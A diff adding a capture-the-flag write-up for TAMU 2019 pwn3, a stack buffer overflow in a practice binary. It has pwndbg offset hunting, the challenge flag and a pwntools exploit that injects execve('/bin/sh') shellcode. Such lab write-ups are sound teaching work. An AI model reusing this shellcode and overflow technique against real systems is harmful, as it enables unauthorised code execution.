@@ -779,6 +779,7 @@ pilot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, 
 ```
 
 ```plain-text
+λ ~/ ./pilot
 [*]Welcome DropShip Pilot...
 [*]I am your assitant A.I....
 [*]I will be guiding you through the tutorial....
@@ -830,4 +831,380 @@ interactive()
 ### Flag
 
 Flag: `flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}`
+
+## TAMU 2019 pwn3
+
+### Information
+
+ - Category: Pwn
+ - Points: 387
+
+### Description
+
+> This challenge tackles stack buffer overflow leading to a shellcode execution.
+
+<Download name="pwn3" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/06-bof_shellcode/tamu19_pwn3/pwn3" type="Binary" />
+
+### Writeup
+
+```plain-text
+λ ~/ file pwn3
+pwn3: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6ea573b4a0896b428db719747b139e6458d440a0, not stripped
+λ ~/ pwn checksec pwn3
+[*] '/home/cub3y0nd/pwn3'
+    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX unknown - GNU_STACK missing
+    PIE:      PIE enabled
+    Stack:    Executable
+    RWX:      Has RWX segments
+```
+
+```plain-text
+λ ~/ ./pwn3
+Take this, you might need it on your journey 0xffda23ae!
+aight!
+```
+
+伪代码：
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  setvbuf(stdout, (char *)&dword_0 + 2, 0, 0);
+  echo(&argc);
+  return 0;
+}
+```
+
+```c
+char *echo()
+{
+  char s[294]; // [esp+Eh] [ebp-12Ah] BYREF
+
+  printf("Take this, you might need it on your journey %p!\n", s);
+  return gets(s);
+}
+```
+
+一开始我还疑惑 `ebp-0x12a` 是个什么东西，后来调试发现和程序给我们的地址是一样的。那就不难想到它是想让我们把 shellcode 塞到这个地址里面。
+
+调试过程如下：
+
+```plain-text
+pwndbg> disass main
+Dump of assembler code for function main:
+   0x000005e3 <+0>:	lea    ecx,[esp+0x4]
+   0x000005e7 <+4>:	and    esp,0xfffffff0
+   0x000005ea <+7>:	push   DWORD PTR [ecx-0x4]
+   0x000005ed <+10>:	push   ebp
+   0x000005ee <+11>:	mov    ebp,esp
+   0x000005f0 <+13>:	push   ebx
+   0x000005f1 <+14>:	push   ecx
+   0x000005f2 <+15>:	call   0x629 <__x86.get_pc_thunk.ax>
+   0x000005f7 <+20>:	add    eax,0x19d5
+   0x000005fc <+25>:	mov    edx,DWORD PTR [eax+0x28]
+   0x00000602 <+31>:	mov    edx,DWORD PTR [edx]
+   0x00000604 <+33>:	push   0x0
+   0x00000606 <+35>:	push   0x0
+   0x00000608 <+37>:	push   0x2
+   0x0000060a <+39>:	push   edx
+   0x0000060b <+40>:	mov    ebx,eax
+   0x0000060d <+42>:	call   0x440 <setvbuf@plt>
+   0x00000612 <+47>:	add    esp,0x10
+   0x00000615 <+50>:	call   0x59d <echo>
+   0x0000061a <+55>:	mov    eax,0x0
+   0x0000061f <+60>:	lea    esp,[ebp-0x8]
+   0x00000622 <+63>:	pop    ecx
+   0x00000623 <+64>:	pop    ebx
+   0x00000624 <+65>:	pop    ebp
+   0x00000625 <+66>:	lea    esp,[ecx-0x4]
+   0x00000628 <+69>:	ret
+End of assembler dump.
+pwndbg> disass echo
+Dump of assembler code for function echo:
+   0x0000059d <+0>:	push   ebp
+   0x0000059e <+1>:	mov    ebp,esp
+   0x000005a0 <+3>:	push   ebx
+   0x000005a1 <+4>:	sub    esp,0x134
+   0x000005a7 <+10>:	call   0x4a0 <__x86.get_pc_thunk.bx>
+   0x000005ac <+15>:	add    ebx,0x1a20
+   0x000005b2 <+21>:	sub    esp,0x8
+   0x000005b5 <+24>:	lea    eax,[ebp-0x12a]
+   0x000005bb <+30>:	push   eax
+   0x000005bc <+31>:	lea    eax,[ebx-0x191c]
+   0x000005c2 <+37>:	push   eax
+   0x000005c3 <+38>:	call   0x410 <printf@plt>
+   0x000005c8 <+43>:	add    esp,0x10
+   0x000005cb <+46>:	sub    esp,0xc
+   0x000005ce <+49>:	lea    eax,[ebp-0x12a]
+   0x000005d4 <+55>:	push   eax
+   0x000005d5 <+56>:	call   0x420 <gets@plt>
+   0x000005da <+61>:	add    esp,0x10
+   0x000005dd <+64>:	nop
+   0x000005de <+65>:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x000005e1 <+68>:	leave
+   0x000005e2 <+69>:	ret
+End of assembler dump.
+pwndbg> b *echo+38
+Breakpoint 1 at 0x5c3
+pwndbg> r
+Starting program: /home/cub3y0nd/Projects/CTF/pwn3
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/usr/lib/libthread_db.so.1".
+
+Breakpoint 1, 0x565555c3 in echo ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────
+*EAX  0x565556b0 ◂— push esp /* 'Take this, you might need it on your journey %p!\n' */
+*EBX  0x56556fcc (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ed4
+ ECX  0x0
+*EDX  0xf7f948a0 ◂— 0x0
+*EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
+*ESI  0x56555630 (__libc_csu_init) ◂— push ebp
+*EBP  0xffffd5c8 —▸ 0xffffd5d8 ◂— 0x0
+*ESP  0xffffd480 —▸ 0x565556b0 ◂— push esp /* 'Take this, you might need it on your journey %p!\n' */
+*EIP  0x565555c3 (echo+38) —▸ 0xfffe48e8 ◂— 0x0
+────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────────────────────────────────────────────────
+ ► 0x565555c3 <echo+38>    call   56555410h                     <printf@plt>
+        format: 0x565556b0 ◂— 'Take this, you might need it on your journey %p!\n'
+        vararg: 0xffffd49e ◂— 0x80000
+
+   0x565555c8 <echo+43>    add    esp, 10h
+   0x565555cb <echo+46>    sub    esp, 0ch
+   0x565555ce <echo+49>    lea    eax, [ebp - 12ah]
+   0x565555d4 <echo+55>    push   eax
+   0x565555d5 <echo+56>    call   56555420h                     <gets@plt>
+
+   0x565555da <echo+61>    add    esp, 10h
+   0x565555dd <echo+64>    nop
+   0x565555de <echo+65>    mov    ebx, dword ptr [ebp - 4]
+   0x565555e1 <echo+68>    leave
+   0x565555e2 <echo+69>    ret
+────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────
+00:0000│ esp 0xffffd480 —▸ 0x565556b0 ◂— push esp /* 'Take this, you might need it on your journey %p!\n' */
+01:0004│-144 0xffffd484 —▸ 0xffffd49e ◂— 0x80000
+02:0008│-140 0xffffd488 ◂— 0xffffffff
+03:000c│-13c 0xffffd48c —▸ 0x565555ac (echo+15) ◂— add ebx, 1a20h
+04:0010│-138 0xffffd490 ◂— 0x100
+05:0014│-134 0xffffd494 ◂— 0x0
+06:0018│-130 0xffffd498 ◂— 0x40 /* '@' */
+07:001c│-12c 0xffffd49c ◂— 0x8000
+──────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────
+ ► 0 0x565555c3 echo+38
+   1 0x5655561a main+55
+   2 0xf7d84bd7
+   3 0xf7d84c9d __libc_start_main+141
+   4 0x56555491 _start+49
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> x/s $ebp-0x12a
+0xffffd49e:	""
+pwndbg> x/s $ebx-0x191c
+0x565556b0:	"Take this, you might need it on your journey %p!\n"
+pwndbg> cyclic 300
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
+pwndbg> c
+Continuing.
+Take this, you might need it on your journey 0xffffd49e!
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
+
+Program received signal SIGSEGV, Segmentation fault.
+0x56555622 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────
+*EAX  0x0
+*EBX  0x61796361 ('acya')
+*ECX  0xf7f948ac ◂— 0x0
+*EDX  0x0
+ EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
+ ESI  0x56555630 (__libc_csu_init) ◂— push ebp
+*EBP  0xff006361
+*ESP  0xff006359
+*EIP  0x56555622 (main+63) ◂— pop ecx
+────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────────────────────────────────────────────────
+ ► 0x56555622 <main+63>                    pop    ecx
+   0x56555623 <main+64>                    pop    ebx
+   0x56555624 <main+65>                    pop    ebp
+   0x56555625 <main+66>                    lea    esp, [ecx - 4]
+   0x56555628 <main+69>                    ret
+
+   0x56555629 <__x86.get_pc_thunk.ax>      mov    eax, dword ptr [esp]
+   0x5655562c <__x86.get_pc_thunk.ax+3>    ret
+
+   0x5655562d <__x86.get_pc_thunk.ax+4>    nop
+   0x5655562f <__x86.get_pc_thunk.ax+6>    nop
+   0x56555630 <__libc_csu_init>            push   ebp
+   0x56555631 <__libc_csu_init+1>          push   edi
+────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────
+<Could not read memory at 0xff006359>
+──────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────
+ ► 0 0x56555622 main+63
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> cyclic -l acya
+Finding cyclic pattern of 4 bytes: b'acya' (hex: 0x61637961)
+Found at offset 294
+```
+
+这里发现一个新的计算偏移量方法：
+
+```plain-text
+pwndbg> b *echo+56
+Breakpoint 1 at 0x5d5
+pwndbg> b *echo+61
+Breakpoint 2 at 0x5da
+pwndbg> r
+Starting program: /home/cub3y0nd/Projects/CTF/pwn3
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/usr/lib/libthread_db.so.1".
+Take this, you might need it on your journey 0xffffd49e!
+
+Breakpoint 1, 0x565555d5 in echo ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────
+*EAX  0xffffd49e ◂— 0x80000
+*EBX  0x56556fcc (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ed4
+ ECX  0x0
+ EDX  0x0
+*EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
+*ESI  0x56555630 (__libc_csu_init) ◂— push ebp
+*EBP  0xffffd5c8 —▸ 0xffffd5d8 ◂— 0x0
+*ESP  0xffffd480 —▸ 0xffffd49e ◂— 0x80000
+*EIP  0x565555d5 (echo+56) —▸ 0xfffe46e8 ◂— 0x0
+────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────
+ ► 0x565555d5 <echo+56>    call   56555420h                     <gets@plt>
+        arg[0]: 0xffffd49e ◂— 0x80000
+        arg[1]: 0xffffd49e ◂— 0x80000
+        arg[2]: 0xffffffff
+        arg[3]: 0x565555ac (echo+15) ◂— add ebx, 1a20h
+
+   0x565555da <echo+61>    add    esp, 10h
+   0x565555dd <echo+64>    nop
+   0x565555de <echo+65>    mov    ebx, dword ptr [ebp - 4]
+   0x565555e1 <echo+68>    leave
+   0x565555e2 <echo+69>    ret
+
+   0x565555e3 <main>       lea    ecx, [esp + 4]
+   0x565555e7 <main+4>     and    esp, 0fffffff0h
+   0x565555ea <main+7>     push   dword ptr [ecx - 4]
+   0x565555ed <main+10>    push   ebp
+   0x565555ee <main+11>    mov    ebp, esp
+────────────────────────────────────[ STACK ]─────────────────────────────────────
+00:0000│ esp   0xffffd480 —▸ 0xffffd49e ◂— 0x80000
+01:0004│-144   0xffffd484 —▸ 0xffffd49e ◂— 0x80000
+02:0008│-140   0xffffd488 ◂— 0xffffffff
+03:000c│-13c   0xffffd48c —▸ 0x565555ac (echo+15) ◂— add ebx, 1a20h
+04:0010│-138   0xffffd490 ◂— 0x100
+05:0014│-134   0xffffd494 ◂— 0x0
+06:0018│-130   0xffffd498 ◂— 0x40 /* '@' */
+07:001c│ eax-2 0xffffd49c ◂— 0x8000
+──────────────────────────────────[ BACKTRACE ]───────────────────────────────────
+ ► 0 0x565555d5 echo+56
+   1 0x5655561a main+55
+   2 0xf7d84bd7
+   3 0xf7d84c9d __libc_start_main+141
+   4 0x56555491 _start+49
+──────────────────────────────────────────────────────────────────────────────────
+pwndbg> c
+Continuing.
+1234567
+
+Breakpoint 2, 0x565555da in echo ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────
+ EAX  0xffffd49e ◂— '1234567'
+ EBX  0x56556fcc (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ed4
+*ECX  0xf7f948ac ◂— 0x0
+ EDX  0x0
+ EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
+ ESI  0x56555630 (__libc_csu_init) ◂— push ebp
+ EBP  0xffffd5c8 —▸ 0xffffd5d8 ◂— 0x0
+ ESP  0xffffd480 —▸ 0xffffd49e ◂— '1234567'
+*EIP  0x565555da (echo+61) ◂— add esp, 10h
+────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────
+   0x565555d5 <echo+56>    call   56555420h                     <gets@plt>
+
+ ► 0x565555da <echo+61>    add    esp, 10h
+   0x565555dd <echo+64>    nop
+   0x565555de <echo+65>    mov    ebx, dword ptr [ebp - 4]
+   0x565555e1 <echo+68>    leave
+   0x565555e2 <echo+69>    ret
+    ↓
+   0x5655561a <main+55>    mov    eax, 0
+   0x5655561f <main+60>    lea    esp, [ebp - 8]
+   0x56555622 <main+63>    pop    ecx
+   0x56555623 <main+64>    pop    ebx
+   0x56555624 <main+65>    pop    ebp
+────────────────────────────────────[ STACK ]─────────────────────────────────────
+00:0000│ esp   0xffffd480 —▸ 0xffffd49e ◂— '1234567'
+01:0004│-144   0xffffd484 —▸ 0xffffd49e ◂— '1234567'
+02:0008│-140   0xffffd488 ◂— 0xffffffff
+03:000c│-13c   0xffffd48c —▸ 0x565555ac (echo+15) ◂— add ebx, 1a20h
+04:0010│-138   0xffffd490 ◂— 0x100
+05:0014│-134   0xffffd494 ◂— 0x0
+06:0018│-130   0xffffd498 ◂— 0x40 /* '@' */
+07:001c│ eax-2 0xffffd49c ◂— 0x32318000
+──────────────────────────────────[ BACKTRACE ]───────────────────────────────────
+ ► 0 0x565555da echo+61
+   1 0x5655561a main+55
+   2 0xf7d84bd7
+   3 0xf7d84c9d __libc_start_main+141
+   4 0x56555491 _start+49
+──────────────────────────────────────────────────────────────────────────────────
+pwndbg> search 1234567
+Searching for value: '1234567'
+[heap]          0x565581a0 '1234567\n'
+libc.so.6       0xf7f17011 0x34333231 ('1234')
+libc.so.6       0xf7f2585e '123456789:;<=>?'
+libc.so.6       0xf7f349e3 '123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
+libc.so.6       0xf7f34a41 '123456789abcdefghijklmnopqrstuvwxyz'
+libc.so.6       0xf7f34a81 '123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+libc.so.6       0xf7f34af5 '123456789'
+libc.so.6       0xf7f38af1 '123456789abcdef'
+ld-linux.so.2   0xf7ff1ebd '123456789abcdef'
+[stack]         0xffffd49e '1234567'
+pwndbg> i frame
+Stack level 0, frame at 0xffffd5d0:
+ eip = 0x565555da in echo; saved eip = 0x5655561a
+ called by frame at 0xffffd5f0
+ Arglist at 0xffffd5c8, args:
+ Locals at 0xffffd5c8, Previous frame's sp is 0xffffd5d0
+ Saved registers:
+  ebx at 0xffffd5c4, ebp at 0xffffd5c8, eip at 0xffffd5cc
+pwndbg> hex(0xffffd5cc-0xffffd49e)
++0000 0x00012e
+```
+
+最终偏移量是 `0x12e` 而不是 `0x126` 的原因是中间还隔着两个四字节寄存器 `ebx` 和 `ebp`。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug', terminal='kitty')
+
+target = process('./pwn3')
+
+recvline    = lambda : target.recvline()
+recvuntil   = lambda str : target.recvuntil(str)
+sendline    = lambda str : target.sendline(str)
+interactive = lambda : target.interactive()
+
+recvuntil(b'journey ')
+
+leak_addr = p32(int(recvuntil(b'!').strip(b'!\n'), 16))
+
+shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
+payload = shellcode + b'A' * (0x12e - len(shellcode)) + leak_addr
+
+sendline(payload)
+interactive()
+```
+
+### Flag
+
+Flag: `gigem{r3m073_fl46_3x3cu710n}`
 
